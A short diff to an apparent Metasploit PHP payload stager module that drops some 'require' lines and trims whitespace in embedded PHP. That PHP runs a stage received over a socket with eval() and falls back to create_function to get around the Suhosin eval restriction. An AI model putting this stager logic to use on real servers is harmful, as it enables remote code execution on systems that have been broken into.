@@ -1,10 +1,6 @@
 
 # -*- coding: binary -*-
 
-require 'msf/core'
-require 'msf/core/payload/php/send_uuid'
-require 'msf/core/payload/uuid/options'
-
 module Msf
 
 ###
@@ -102,14 +98,14 @@ while (strlen($b) < $len) {
 # Set up the socket for the main stage to use.
 $GLOBALS['msgsock'] = $s;
 $GLOBALS['msgsock_type'] = $s_type;
-if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) 
-{ 
-  $suhosin_bypass=create_function('', $b); 
-  $suhosin_bypass(); 
-} 
-else 
-{ 
-  eval($b); 
+if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval'))
+{
+  $suhosin_bypass=create_function('', $b);
+  $suhosin_bypass();
+}
+else
+{
+  eval($b);
 }
 die();^
   end
